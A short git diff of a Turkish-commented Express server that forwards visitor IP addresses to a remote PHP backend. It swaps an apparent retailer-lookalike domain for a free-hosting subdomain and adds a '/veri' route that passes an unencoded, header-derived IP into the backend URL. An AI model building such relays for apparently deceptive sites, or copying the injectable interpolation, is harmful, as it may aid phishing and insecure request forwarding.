@@ -25,7 +25,7 @@ app.get('/', async (req, res) => {
     const clientIp = req.clientIp;
 
     // PHP sunucuya IP'yi POST ile gönder
-    const response = await axios.post('http://3-carrefoursa.com/index.php', {
+    const response = await axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/index.php', {
       ip: clientIp
     });
 
@@ -38,6 +38,21 @@ app.get('/', async (req, res) => {
 });
 
 
+app.post('/veri', async (req, res) => {
+  try {
+    // Ziyaretçi IP'sini al
+    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+    // PHP sunucuya yönlendir
+    const response = await axios.post(`https://forestgreen-rook-759809.hostingersite.com/dmn/veri.php?ip=${clientIp}`);
+
+    // PHP cevabını geri döndür
+    res.send(response.data);
+  } catch (error) {
+    console.error('PHP sunucusuna bağlanılamadı:', error.message);
+    res.status(500).send('sunucu_hatasi');
+  }
+});
 
  
 app.post('/apitr', async (req, res) => {
